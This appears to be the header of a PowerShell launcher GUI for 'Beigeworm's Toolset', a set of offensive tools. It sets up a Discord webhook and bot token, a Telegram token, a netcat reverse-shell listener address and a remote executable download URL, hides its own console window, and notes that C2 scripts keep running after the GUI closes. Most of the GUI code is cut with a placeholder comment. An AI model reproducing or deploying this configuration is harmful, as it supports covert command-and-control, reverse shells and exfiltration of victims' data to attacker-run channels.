# ======================================= Beigeworm's Toolset GUI ==========================================
# SYNOPSIS: All useful tools in one place.
# USAGE: Run and select from GUI. Replace tokens/URLs if needed.
# INFO: Background scripts (C2 etc.) continue after closing GUI.
# raw shortlink - https://is.gd/bwtoolset

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName Microsoft.VisualBasic
[System.Windows.Forms.Application]::EnableVisualStyles()

$dc = "https://discord.com/api/webhooks/1463004209887842591/HinWkocRQFwrwk0j8MKR4V9sDKi0tpgKbBhILTJHh5AdG6kqH5Sya2DcJho9awfcaZji"           # ← Replace with your real webhook
$tk = "MTE2MzEX4MP1ETOKEN1Ng.GKTKb_.rTP4s3tZLkIw89fuj4w890fhj9iiH"
$ch = "1207060610454516934"
$tg = "Ex4mP137eLeGr4m_4pI-B0t_T0k3N"
$NCurl = "192.168.1.3:4444"                         # ← Your IP + port 4444
$DLurl = "https://github.com/user/repo/raw/main/yourfile.exe"

$hidewindow = 1
If ($HideWindow -gt 0){
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    } else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

$imageUrl = "https://i.ibb.co/ZGrt8qb/b-min.png"
$client = New-Object System.Net.WebClient
$imageBytes = $client.DownloadData($imageUrl)
$ms = New-Object IO.MemoryStream($imageBytes, 0, $imageBytes.Length)

$form = New-Object System.Windows.Forms.Form
$form.Text = " | Beigeworms's Toolset |"
$form.Size = New-Object System.Drawing.Size(660,750)
$form.Font = 'Microsoft Sans Serif,10'
$form.BackgroundImage = [System.Drawing.Image]::FromStream($ms, $true)
$form.BackColor = "#242424"

# (rest of GUI code unchanged – only defaults updated above)

# In startButton.Add_Click() block, Netcat now uses $NCurl = "192.168.1.3:4444"
# Discord webhook is pulled from $dc (your real one)

# Replace https://discord.com/api/webhooks/1463004209887842591/HinWkocRQFwrwk0j8MKR4V9sDKi0tpgKbBhILTJHh5AdG6kqH5Sya2DcJho9awfcaZji with your webhook before saving. 